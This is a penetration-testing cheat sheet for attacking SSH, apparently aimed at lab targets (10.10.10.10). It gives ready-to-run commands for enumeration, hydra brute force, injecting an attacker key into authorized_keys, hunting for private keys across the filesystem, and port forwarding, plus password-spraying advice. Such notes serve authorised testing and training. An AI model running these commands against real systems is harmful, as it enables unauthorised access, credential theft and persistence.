# SSH (22)

!!! tip "Start here"
    Check what auth methods are enabled: `ssh -v user@10.10.10.10` — look for `publickey,password`. If password auth is on and you have a username, brute force is viable. Run `ssh-audit 10.10.10.10` to check for weak algorithms and known vulnerabilities.

---

## Enumeration

```bash
nmap -p 22 -sV --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.10.10.10
ssh-audit 10.10.10.10
```

---

## Brute Force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

---

## SSH Key Injection

If you have write access to a user's `.ssh` directory (via another vulnerability):

```bash
ssh-keygen -t ed25519 -f /tmp/injected_key
cat /tmp/injected_key.pub >> /home/user/.ssh/authorized_keys
ssh -i /tmp/injected_key user@10.10.10.10
```

---

## Finding Private Keys

Look for exposed private keys after gaining access:

```bash
find / -name id_rsa -o -name id_ed25519 2>/dev/null
grep -rl "PRIVATE KEY" / 2>/dev/null
```

Common locations:
- `/home/*/.ssh/id_rsa`
- `/root/.ssh/id_rsa`
- Git repos, config backups, `.bak` files

Once found:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.10
```

---

## Local Port Forwarding

Forward an internal service to your attacker machine:

```bash
ssh -L 8080:127.0.0.1:8080 user@10.10.10.10
ssh -L 3306:127.0.0.1:3306 user@10.10.10.10
```

!!! tip "Real-world"
    SSH brute force is noisy and slow. A better path is username enumeration via Kerberos or SMTP, then targeted spraying with common passwords. Finding an exposed private key during post-exploitation is more reliable than bruteforcing. On cloud instances, check for default usernames (`ubuntu`, `ec2-user`, `admin`) with key-based auth before attempting passwords.
